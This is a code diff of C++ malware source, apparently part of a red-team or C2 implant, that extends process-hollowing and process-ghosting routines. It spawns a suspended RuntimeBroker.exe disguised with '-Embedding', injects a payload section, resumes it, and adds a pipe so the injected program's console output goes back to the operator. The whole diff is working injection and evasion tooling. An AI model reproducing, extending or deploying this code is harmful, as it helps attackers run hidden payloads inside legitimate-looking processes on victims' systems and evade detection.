@@ -94,12 +94,14 @@ tasking::create_ghosted_section(const std::string &payload_buffer) {
     return hsection;
 }
 
+
 bool
 tasking::hollow(
         _In_ HANDLE hsection,
         _In_ const uint32_t entry_point_rva,
         _In_ void* preferred_base,
-        _Out_ bool &mapped_at_preferred
+        _Out_ bool &mapped_at_preferred,
+        std::string& console_output
     ) {
 
     STARTUPINFOA        startupinfo = { 0 };
@@ -108,6 +110,7 @@ tasking::hollow(
 
     void* mapped_at         = preferred_base;
     void* peb_img_base_ptr  = nullptr;
+    char* pipe_output       = nullptr;
 
     char non_const[MAX_PATH]            = { 0 };
     char windows_directory[MAX_PATH]    = { 0 };
@@ -121,11 +124,17 @@ tasking::hollow(
     NTSTATUS status = ERROR_SUCCESS;
     size_t view_size = 0;
 
+    HANDLE hread_pipe   = nullptr;
+    HANDLE hwrite_pipe  = nullptr;
+
     //-----------------------------------------------------//
 
     auto _ = defer([&]() {
         CLOSE_HANDLE(proc_info.hProcess);
         CLOSE_HANDLE(proc_info.hThread);
+        CLOSE_HANDLE(hread_pipe);
+        CLOSE_HANDLE(hwrite_pipe);
+        FREE_HEAP_BUFFER(pipe_output);
     });
 
     //
@@ -140,6 +149,33 @@ tasking::hollow(
     }
 
     //
+    // set up pipe
+    //
+
+    if(!tasking::create_anonymous_pipe(&hread_pipe, &hwrite_pipe)) {
+        return false;
+    }
+
+    startupinfo.cb          = sizeof(startupinfo);
+    startupinfo.hStdOutput  = hwrite_pipe;
+    startupinfo.hStdError   = hwrite_pipe;
+    startupinfo.dwFlags     |= STARTF_USESTDHANDLES;
+
+    //
+    // create read buffer for pipe
+    //
+
+    pipe_output = static_cast<char*>(HeapAlloc(
+        GetProcessHeap(),
+        HEAP_ZERO_MEMORY,
+        4096
+    ));
+
+    if(pipe_output == nullptr) {
+        return false;
+    }
+
+    //
     // Create victim process
     //
 
@@ -147,17 +183,17 @@ tasking::hollow(
         return false;
     }
 
-    curr_directory = std::string(windows_directory) + "\\System32";
-    image_path  = curr_directory + "\\RuntimeBroker.exe";
-    command_line = image_path + " -Embedding";
-    std::memcpy(non_const, command_line.data(), command_line.size());
+    curr_directory      = std::string(windows_directory) + "\\System32";
+    image_path          = curr_directory + "\\RuntimeBroker.exe";
+    command_line        = image_path + " -Embedding";
 
+    memcpy(non_const, command_line.data(), command_line.size());
     if(!CreateProcessA(
-        image_path.c_str(),
+        nullptr,
         non_const,
         nullptr,
         nullptr,
-        FALSE,
+        TRUE,
         CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
         nullptr,
         curr_directory.c_str(),
@@ -224,6 +260,26 @@ tasking::hollow(
     }
 
     ResumeThread(proc_info.hThread);
+
+    //
+    // read output
+    //
+
+    CloseHandle(hwrite_pipe);
+    hwrite_pipe = nullptr;
+
+    uint32_t bytes_read = 0;
+    while(ReadFile(
+        hread_pipe,
+        pipe_output,
+        4095,
+        reinterpret_cast<LPDWORD>(&bytes_read),
+        nullptr
+    ) && bytes_read > 0) {
+        console_output += pipe_output;
+        std::memset(pipe_output, '\0', 4096);
+    }
+
     return true;
 }
 
@@ -357,6 +413,8 @@ tasking::ghost(_In_ HANDLE hsection, _In_ uint32_t entry_point_rva) {
     if(status != ERROR_SUCCESS) {
         return false;
     }
+
+
     ppeb = static_cast<PUNDOC_PEB>(HeapAlloc(
         GetProcessHeap(),
         HEAP_ZERO_MEMORY,
@@ -366,6 +424,7 @@ tasking::ghost(_In_ HANDLE hsection, _In_ uint32_t entry_point_rva) {
     if(ppeb == nullptr) {
         return false;
     }
+
 
     if(!ReadProcessMemory(
         hprocess,
@@ -490,22 +549,26 @@ tasking::runexe(const bool hollow, const std::string& file_buffer) {
     void* preferred_base = get_img_preferred_base(file_buffer);
 
     if(hollow) {
+
         bool mapped_at_preferred = false;
-        if(!tasking::hollow(hsection, entry_point_rva, preferred_base, mapped_at_preferred)) {
+        std::string console_output;
+
+        if(!tasking::hollow(hsection, entry_point_rva, preferred_base, mapped_at_preferred, console_output)) {
             return "failed to perform hollowing.";
         }
 
         if(mapped_at_preferred) {
-            return "successfully performed hollowing. mapped at preferred base address.";
+            return "successfully performed hollowing. mapped at preferred base address.\nconsole output:\n" + console_output;
         }
-        return "executable was not mapped at preferred base, issues may occur";
+
+        return "executable was not mapped at preferred base, issues or crashes may occur.\nconsole output:\n" + console_output;
     }
 
-    if(!tasking::ghost(hsection, entry_point_rva)) {
+    if(!ghost(hsection, entry_point_rva)) {
         return "failed to perform ghosting.";
     }
 
-    return "performed process ghosting.";
+    return "performed process ghosting. Executable ran.";
 }
 
 
